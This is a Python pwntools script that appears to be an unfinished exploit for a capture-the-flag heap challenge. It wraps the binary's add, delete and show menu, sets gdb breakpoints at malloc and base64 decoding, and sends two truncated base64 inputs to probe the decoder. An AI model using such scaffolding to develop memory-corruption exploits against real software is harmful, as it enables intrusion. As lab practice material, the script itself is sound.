#!/usr/bin/env python3
from pwn import *
from base64 import b64decode, b64encode
io = process('./pwn')
elf = ELF('./pwn')

context.terminal = ["tmux", "splitw", "-h", "-l", "160"]


libc = elf.libc
r 		= lambda num			: io.recv(num)
ru		= lambda data			: io.recvuntil(data)
rl		= lambda			: io.recvline()
s 		= lambda data 			: io.send(data)
sl 		= lambda data 			: io.sendline(data)
sa		= lambda data,pay		: io.sendafter(data,pay)
sla		= lambda data,pay		: io.sendlineafter(data,pay)
uu64 		= lambda size			: u64(io.recv(size).ljust(8,b'\x00'))
uu32		= lambda size			: u32(io.recv(size).ljust(4,b'\x00'))
itr 		= lambda 			: io.interactive()
li		= lambda x 			: print('\x1b[01;38;5;214m' + x + '\x1b[0m')
u64_ex		= lambda x : u64(x.ljust(8,b'\x00'))

def mygdb(cmd=''):
    gdb.attach(io,cmd)#brva 0xe93
    pause()

input_after_this = b'Enter your choice:'


def add_en(data):
    sla(input_after_this, b'1')
    sa(b'text', data)


def add_de(data):
    sla(input_after_this, b'2')
    sa(b'text', data)


def dele_en(idx):
    sla(input_after_this, b'3')
    sla(b'idx', str(idx))


def dele_de(idx):
    sla(input_after_this, b'4')
    sla(b'idx', str(idx))


def show_en(idx):
    sla(input_after_this, b'5')
    sla(b'idx', str(idx))


def show_de(idx):
    sla(input_after_this, b'6')
    sla(b'idx', str(idx))

def b64encode1(data):
    tmp = b64encode(data)
    print("len:", hex(len(tmp)))
    return tmp

mygdb("brva 0x1D1D\nbrva 0x1D6F") #在malloc和debase64下断点
add_de(b64encode(b'\x00' * 0x3)[:-1]) 
add_de(b64encode(b'a' * 0x3)[:-1]) 

itr()
